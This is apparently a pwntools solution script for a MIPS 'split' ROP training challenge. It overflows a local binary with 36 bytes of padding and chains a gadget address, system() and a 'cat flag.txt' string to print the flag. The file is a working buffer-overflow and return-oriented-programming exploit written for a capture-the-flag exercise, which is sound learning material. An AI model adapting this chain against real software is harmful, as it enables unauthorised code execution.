#/usr/bin/python
from pwn import process, p32, log
shell = process("./split_mipsel")

offset = 36
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x00400a20) # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
payload += p32(0x0)        # padding
payload += p32(0x400b70)   # system()
payload += p32(0x411010)   # "cat flag.txt"

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
